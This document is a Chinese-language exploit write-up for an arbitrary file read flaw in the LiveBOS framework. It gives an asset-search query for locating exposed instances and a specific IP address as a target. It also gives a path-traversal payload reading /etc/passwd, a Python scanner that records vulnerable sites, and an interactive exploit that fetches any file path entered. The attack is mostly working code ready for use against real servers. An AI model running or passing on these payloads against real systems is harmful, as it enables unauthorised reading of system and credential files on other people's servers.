## 一、资产搜索

```
app="LiveBOS-框架" && body=" Power by LiveBOS"
```

## 二、网站测试

```
http://218.5.27.51:8080
```

## 三、验证漏洞

```
/feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../../../../../../../etc/passwd
```

![image-20240918192918879](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240918192918879.png)

## 四、POC

```
def poc(target):
    payload = "/feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../../../../../../../etc/passwd"
    try:
        res1 = requests.get(url=target,verify=False,timeout=5)
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload,verify=False,timeout=5)
            if "root" in res2.text:
                with open("result.txt","a",encoding="utf-8") as f:
                    f.write(f"该网站[+]{target}存在任意文件读取漏洞\n")
                    return True
            else:
                print(f"该网站[+]{target}不存在任意文件读取漏洞")
        else:
            print(f"该网站[+]{target}有问题，请手动测试！！")
    except Exception as e:
        print(e)
```

## 五、EXP

```
def exp(target):
    while True:
        content = input("请输入要查看的路径，从/目录开始输入(q退出)\n>>>>>>>>>>>>>>>>>>")
        payload = f"/feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../../../../../../.."
        res1 = requests.get(url=target, verify=False,timeout=5)
        if content == "q":
            exit()
        if res1.status_code == 200:
            res2 = requests.get(url=target + payload + content, verify=False, timeout=5)
            print(res2.text)
        else:
            print("该文件不存在，请重新输入！！")
```

## 六、测试结果

![image-20240918193420430](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240918193420430.png)

![image-20240918193357831](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240918193357831.png)

![image-20240918193515126](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240918193515126.png)

